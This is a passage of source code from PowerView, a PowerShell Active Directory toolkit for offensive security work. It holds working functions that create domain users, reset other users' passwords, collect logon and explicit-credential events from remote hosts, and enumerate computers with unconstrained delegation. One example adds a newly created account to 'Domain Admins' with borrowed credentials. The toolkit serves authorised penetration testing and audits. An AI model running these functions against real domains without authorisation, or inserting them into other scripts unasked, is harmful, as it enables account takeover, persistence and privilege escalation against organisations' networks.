                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {
<#
.SYNOPSIS

Creates a new domain user (assuming appropriate permissions) and returns the user object.

TODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.UserPrincipal with the specified user properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the user to create.
Maximum of 256 characters. Mandatory.

.PARAMETER AccountPassword

Specifies the password for the created user. Mandatory.

.PARAMETER Name

Specifies the name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the user to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword

Creates the 'harmj0y2' user with the specified description and password.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$user = New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -Credential $Cred

Creates the 'harmj0y2' user with the specified description and password, using the specified
alternate credentials.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred

Creates the 'andy' user with the specified description and password, using the specified
alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
and the alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        # set all the appropriate user parameters
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $Description
        }

        Write-Verbose "[New-DomainUser] Attempting to create user '$SamAccountName'"
        try {
            $Null = $User.Save()
            Write-Verbose "[New-DomainUser] User '$SamAccountName' successfully created"
            $User
        }
        catch {
            Write-Warning "[New-DomainUser] Error creating user '$SamAccountName' : $_"
        }
    }
}


function Set-DomainUserPassword {
<#
.SYNOPSIS

Sets the password for a given user identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified user -Identity,
which returns a DirectoryServices.AccountManagement.UserPrincipal object. The
SetPassword() function is then invoked on the user, setting the password to -AccountPassword.

.PARAMETER Identity

A user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
specifying the user to reset the password for.

.PARAMETER AccountPassword

Specifies the password to reset the target user's to. Mandatory.

.PARAMETER Domain

Specifies the domain to use to search for the user identity, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword

Resets the password for 'andy' to the password specified.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred

Resets the password for 'andy' usering the alternate credentials specified.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ 'Identity' = $Identity }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
            try {
                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
            }
            catch {
                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
            }
        }
        else {
            Write-Warning "[Set-DomainUserPassword] Unable to find user '$Identity'"
        }
    }
}


function Get-DomainUserEvent {
<#
.SYNOPSIS

Enumerate account logon events (ID 4624) and Logon with explicit credential
events (ID 4648) from the specified host (default of the localhost).

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses an XML path filter passed to Get-WinEvent to retrieve
security events with IDs of 4624 (logon events) or 4648 (explicit credential
logon events) from -StartTime (default of now-1 day) to -EndTime (default of now).
A maximum of -MaxEvents (default of 5000) are returned.

.PARAMETER ComputerName

Specifies the computer name to retrieve events from, default of localhost.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events to retrieve. Default of 5000.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer.

.EXAMPLE

Get-DomainUserEvent

Return logon events on the local machine.

.EXAMPLE

Get-DomainController | Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))

Return all logon events from the last 3 days from every domain controller in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000

Return a max of 1000 logon events from the specified machine using the specified alternate credentials.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogonEvent

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # the XML filter we're passing to Get-WinEvent
        $XPathFilter = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $EventArguments = @{
            'FilterXPath' = $XPathFilter
            'LogName' = 'Security'
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments['ComputerName'] = $Computer

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    # logon event
                    4624 {
                        # skip computer logons, for now...
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $Output
                        }
                    }

                    # logon with explicit credential
                    4648 {
                        # skip computer logons, for now...
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $Output
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {
<#
.SYNOPSIS

Helper to build a hash table of [GUID] -> resolved names for the current or specified Domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-Forest  

.DESCRIPTION

Searches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for
all objects with schemaIDGUID set and translates the GUIDs discovered to human-readable names.
Then searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)
for objects where objectClass=controlAccessRight, translating the GUIDs again.

Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.OUTPUTS

Hashtable

Ouputs a hashtable containing a GUID -> Readable Name mapping.

.LINK

http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $ForestArguments = @{}
    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }

    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }
    if (-not $SchemaPath) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    $SearcherArguments = @{
        'SearchBase' = $SchemaPath
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $RightsSearcher = Get-DomainSearcher @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Get-DomainComputer {
<#
.SYNOPSIS

Return all computers or specific computer objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all computer objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Unconstrained

Switch. Return computer objects that have unconstrained delegation.

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER Printers

Switch. Return only printers.

.PARAMETER SPN

Return computers with a specific service principal name, wildcards accepted.

.PARAMETER OperatingSystem

Return computers with a specific operating system, wildcards accepted.

.PARAMETER ServicePack

Return computers with a specific service pack, wildcards accepted.

.PARAMETER SiteName

Return computers in the specific AD Site name, wildcards accepted.

.PARAMETER Ping

Switch. Ping each host to ensure it's up before enumerating.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainComputer

Returns the current computers in current domain.

.EXAMPLE

Get-DomainComputer -SPN mssql* -Domain testlab.local

Returns all MS SQL servers in the testlab.local domain.

.EXAMPLE

Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname

Return the dns hostnames of servers trusted for delegation.

.EXAMPLE

Get-DomainComputer -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -Unconstrained

Search the specified OU for computeres that allow unconstrained delegation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainComputer -Credential $Cred

.OUTPUTS

PowerView.Computer

Custom PSObject with translated computer property fields.

PowerView.Computer.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
